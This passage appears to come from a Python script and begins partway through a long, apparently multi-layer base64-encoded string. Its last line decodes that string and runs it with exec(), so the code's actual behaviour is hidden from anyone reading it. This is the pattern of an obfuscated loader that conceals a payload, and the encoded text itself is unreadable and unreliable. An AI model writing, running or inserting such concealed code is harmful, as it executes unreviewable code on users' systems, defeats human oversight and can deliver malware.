TFzU25OWFZFazFZVEZ3V0ZWWVZtRk5iRmwzVXpCT1MyUnRSalZUV0VKRVlWVkdibE5WVGtKVE1HeEVVVmRrU2xJeFNuTlhiV3hEVFZkS2RHVklXbHBOYmxKdFdraHdSazFyZEVsVWJYaHBVakZzZDFOVlRYZExNR3hJVTI1YWFVMXVZekpSTW14Q1dqQnNSRkZYWkVwUk1FWnVXVEJrUjA1WFNraFBWMmhoVVRCRk5WTlZhSHBhTUd4MFVtMXdXazFxYTNoWmJUVlRXbXhzV1ZacVFtaFJNR3N5VTFWb1QySkhTa2hYV0ZaYVYwWlpkMWxWV1RWTlIwbDVaRWQ0YVdGVlNUVlJNbXhDV2pCc1JGRlhaRXBSTUVadVdUQmtSMlZXYkZoTldIQktVa1JDYmxwWWJFSmhWMFY1Vm1wV1NtRnRPVzVaZWtwWFl6RndjRTVYYUZwTmF6VnpXWHBPVDFwdFJYbFdhbFpLVTBSQ1RGTlZUa0phTUd4RVVWZGtTbEV3U2pWWGJHaFBaREpKZVU1WWNHRlZNRVUxVTFWb1MySkhUbGxXYlhocVRURktObFJITlVOa2JVMTZWVmM1WVdGVmJ6TlhSRVUxVW14U2NsVnNSbFZOUjNoUVZtdFpOVlpzVm5KbFIxcFpUWHBDTWxwR1l6RmpNa2w1Vkc1S1dVMHlUalJVYld4S1l6QnNTVkZ0YUdwaVZWb3dXVE52ZUdReGJGbFRiV2hwVjBVeGVsTlZaRk5oUjFKSVVsUnNhbEl3V1RGWmEyTTFZVVp3UkdFd2RFcFJNRVp1VTFWT1Fsb3diRVJSYm14aFYwVTFNMWxxU1RGbGJIQlhUMWQwWVZZd05USlhhMlJYWVRCc1JVMUhaR3BpVmxvMldUQmpOV1JYVFhsV1dGWm9ZbXMxTWxsdGJHNWpSVTV3VVZka1NsRXdSbTVUVlU1Q1dqSk9kRlpxUW10WFJYQXhVMVZvUzJKSFRYcFJibHBwWW1zMWMxZEVTbE5pUm10NVQxZDBZVll4UmpGWGFrcFhUVVYwUkZOdVdtaGxWV3gzVVRKc1Fsb3diRVJSVlhSS1VUQkdibE5WWkZOaVJuQndVV3BHYVdKWWFESlhWRW93V20xR1NFOVliR2xpYXpGMldYcEtWMk14Y0hCaE1tUk5Wa1JTYmxkWE1EVmtiVXBGWWpCMFNsRXdSbTVUVlU1Q1dqQnNSRkZ1WkZwWFIzaDZXV3BLUjJFd2JFVk5SMlJzWlZWR2NGZFdaRTloYlVsNlZtNVdhMUpxYkc5YVJtaFRZakJzY1dJeVpHcE5iRnA2VjIxck1XRkhVbGxWYlRsWlRURktNbGxVU2xka1ZXeEpUVVYwU2xFd1JtNVRWVTVDV2pCc1JGRnVaRnBYUlhCdldXeG9UbG94UWxSUmFtUktVVEJ3ZVZkc2FISmhWVGx3VVc1d1lWWXphSFJVUnpGSFlXeHJlVlp1Y0dwTlZHeDVWMnhvY2xveVdsSmlNbVJLVVRCR2JsTlZUa0phTUd4SlUyMTRhazB3U2pKWmJUVlBZa1ZzUlUxSFpHcGlWbG8wV2taa1YyVnRVa2xVV0ZacVVucHNObHBGVG05aVZXeDFaRWRhV1UxR1dsQlZhMXBEVlVaT1ZrNVdWbGxOVmxwVVZrVlpOVnB0V2xSUFZFWnBZbGhvTWxkVVNqQmFiVVpJVDFoc2FXSnJNWEJVUlU1RFpERnNXVk50YUdsWFJUQTFXVEJrUjJWV2JGaE5XSEJOVVRCS2NsZFdhRk5oUmtKWlVXMW9iRll6YURKWFZtUlNZMFZPY0ZGWFpFcFJNRVp1VTFWT1Fsb3lUblJXYm5CcVVucHNNVmw2U2xkYWJIQklWbTF3YVUxc1NuTlhhMDVDVDFWc1NWTnRlR3BOTUVveVdXMDFUMkpGZUhSalNIQnBUV3BTZGxNeFJuWmFNR3hFVVZka1NsRXdSbTVUVldoTFlrZFNTVlp1YkdsaFZVbzFWMnhvVDJReVNYbE9XSEJoVm1wc2NsZHNaRTlrYkhCSVZtMTBUV0pYVW5OYVJVNXVZVmRKZVdNeWJFeFZWemx1VTFWT1Fsb3dUbkJSVjJSS1VUQktjbGRzWkZwYU1YQklZa2h3V2xZd2NIcFhiRmsxWWtkS2RGcElRbWxpVmxwdFYydGtSMlJHYkZoYVIzaE1VMFUxYzFsclpGcGpSV3hFVFVOMFNsSXdjREpaYWtvelRtdE9jRkZYWkVwUk1FWnVVMVZPUWxveVRraFNhbFpwVW5wc2IxZHJUa0pQVld4Sll6SmtTbUpWV25GWFZFazFUVmRLZFZWdFdscFhSbGwzV1ZWT1NrNXJiRWxVYlhocFVqRnNNVmRXYUZkTlIwWkhUMVJDYVUxdVVuTlpiV3hEVDFWT2NGRlhaRXBSTUVadVUxVk9RbG95VGtoU2JteGFWbnBHTmxOVlVYZGFNbFkxVVZkc2FFMXNXVEZUVjNCMldqSk5lVlp1VG1GaFZGWnZWMVJLVDJKSFRYcFViVnBvVFd4Wk1WTlZaM2RUTUd4RVVWZGtTbEV3Um01VFZVNURaVlp3V1ZSdVpHbE5hbFkyVjJ4T1FrOVZiRWxUYlhocVYwWmFjMWw2VGxObGEzaDFVVzVhYWsweFJuWlhiV3hMVGpGbmVFOVZXbFZoTVVwU1ZrUkNjMVF4V2tkUFZscFdZVE5vYlZkRVRYZGtiSEJJWWtod1dsWXdjSHBYYkZrMVlURnNXRTFYYUdGTmJGWndWRVZPUTJReGJGbFRiV2hwVjBVd05Wa3daRWRsVm14WVRWaHdUVkV3U25KWFZtaFRZVVpDV1ZGdGFHeFdNMmd5VjFaa1VtTkZUbkJSVjJSS1VUQkdibE5WVGtKYU1rNTBWbTV3YWxKNmJERlpla3BYV214d1NGWnRjR2xOYkVwelYydE9RazlWYkVsVGJYaHFUVEJLTWxsdE5VOWlSWGgwWTBod2FVMXFVblpUTVVaMldqQnNSRkZYWkVwUk1FWnVVMVZvUzJKSFVrbFdibXhwWVZWS05WZHNhRTlrTWtsNVRsaHdZVlpxYkhKWGJHUlBaR3h3U0ZadGRFMWlWMUp6V2tWT2JtRlhTWGxqTW14TVZWYzVURk5WVGtKYU1HeElWVzE0WVdGVlNYaFpiVEUwWTBkS1dHSkVRbUZXTVVwdFYyMDFWMkpIU2tSaFNIQmhWak5vZEZNeFRrSmtSa0p3VVcxc2FVMXFiSHBVTW1SMldqQnNSRkZYWkVwUk1FWnVVMVZvUTJGSFZsaGxTRnBhVmpGR2JsVkdUa05PTUd4RVUyMW9XazFyTlRKYVJtTXhUVVpuZVZKcVJtdFNNbVJ3VkRKc1EyVnNjRmhsUnpGTllsVlplRnBGWkc5YWJWSklUMWhLWVZaNlVtNWFiRVoyV2pCc1JGRlhaRXBSTUVadVUxVm9RMkZIVG5SU2JsSnFaVlZGTlZOVmFIcGFNR3gwWkVkNGJGVXdhekpUVldoUFlrZEtTRmRZVmxwV01EVnhWMnhvVDJWc1ozbGtSM2hzVlRCSk5WRXliRUphTUd4RVVWZGtTbEV3Um01Wk1qRlhaVzFPU0U5WVZtcE5iRlp1VlVaT1EyVldjRmxTYWtaaFYwVTBkMWt6YXpGa01rbDZWR3BDVEZJeGJIQmFWRVUxV214S1ZrNVZWbFpTVkd4TFZrZDRVMXBzV2xkVGF6RlpUVlJyTlZSRVRsZGtWMHBJWWtoU2FGZEdTbk5YYTFrMVlsZFNXRlp1VGtwaFdHUnVXVEJrUjJWV2JGaE5XSEJSVjBWS2Ixa3lNVWRrUjA0MVpESmtZVkl3V1hkWFZsRjRaREZzV1dKSVRtbE5hMXB5VXpGR2Rsb3diRVJSVjJSS1VUQkdibE5WYUV0aVIwMTZVVzVhYVdKck5YTlhSRXBUWWtacmVVOVhkR0ZXTVVadVZVWk9RMlZXY0ZsVWJtUnBUV3BXTmxkc1RURmpWMDE1VDFoV1RGRXlkRXhUVlU1Q1dqQnNSRkZYWkVwUk1FbzFWMnhvVTAxWFRuUk9SMlJxWWxaYU5sa3dZelZrVjAxNVZtMWFZVkl4V25GWmFrcFRZa1p3UkU1WE5XRlhSa1oyVTFjd05XTnJiSEJoTUhSS1VUQkdibE5WUm5aYU1HeEVVVmRrWVZJeFduUlRWV2hQWWtkU1IwOVlaR2xTTUZreFYyeG9TMXB0VVhsaVNGWnFaVmRvTmxkc1pEUmlWWGhFVVcxb2FWWjZhM2haYlRWU1kwVnNSRTFEZEVwU01IQXlXV3BLTTA1clRuQlJWMlJLVVRCR2JsTlZUa0phTWs1SVVtcFdhVko2Ykc5WGEwNUNUMVZzU1dNd2RFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5YTVVkaGJHdDVUMVJHYVdKc1NtMVhWbWhYVFVkR1JGTlVXa3BUUlRWeldXdGtXbVJXYkZsV2FrSm9VbXByZDFscVNqQmlSMHB3WkRCMFNsRXdSbTVUVlU1Q1dqQnNSRkZY'''
exec(base64.b64decode(encoded_data).decode('utf-8'))